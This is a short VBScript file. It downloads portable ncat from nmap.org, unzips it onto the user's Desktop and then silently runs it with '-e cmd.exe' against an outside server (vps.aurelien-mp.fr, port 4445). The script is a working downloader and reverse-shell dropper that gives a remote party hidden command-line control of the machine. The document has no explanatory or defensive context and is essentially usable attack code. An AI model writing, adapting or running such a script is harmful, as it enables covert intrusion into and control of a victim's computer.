strLink = "http://nmap.org/dist/ncat-portable-5.59BETA1.zip"
    ' Get file name from URL.
    ' http://download.windowsupdate.com/microsoftupdate/v6/wsusscan/wsusscn2.cab -> wsusscn2.cab
    set oShell = WScript.CreateObject("WSCript.shell")
	strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
	MsgBox strHomeFolder
    strSaveTo = strHomeFolder & "\Desktop\d.zip"
	'MsgBox strSaveTo

    ' Create an HTTP object
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )

    ' Download the specified URL
    objHTTP.Open "GET", strLink, False
    ' Use HTTPREQUEST_SETCREDENTIALS_FOR_PROXY if user and password is for proxy, not for download the file.
    ' objHTTP.SetCredentials "User", "Password", HTTPREQUEST_SETCREDENTIALS_FOR_SERVER
    objHTTP.Send

         Set objFSO = CreateObject("Scripting.FileSystemObject")
     If objFSO.FileExists(strSaveTo) Then
       objFSO.DeleteFile(strSaveTo)
     End If

     If objHTTP.Status = 200 Then
       Dim objStream
       Set objStream = CreateObject("ADODB.Stream")
       With objStream
           .Type = 1 'adTypeBinary
           .Open
           .Write objHTTP.ResponseBody
           .SaveToFile strSaveTo
           .Close
       End With
       set objStream = Nothing
     End If

ZipFile = strHomeFolder & "\Desktop\d.zip"
'The folder the contents should be extracted to.
ExtractTo = strHomeFolder & "\Desktop\"

'If the extraction location does not exist create it.
Set fso = CreateObject("Scripting.FileSystemObject")
If NOT fso.FolderExists(ExtractTo) Then
   fso.CreateFolder(ExtractTo)
End If

'Extract the contants of the zip file.
set objShell = CreateObject("Shell.Application")
set FilesInZip=objShell.NameSpace(ZipFile).items
objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)
Set fso = Nothing
Set objShell = Nothing
	
oShell.run "cmd /c ncat-portable-5.59BETA1\ncat.exe -e cmd.exe vps.aurelien-mp.fr 4445",0,true
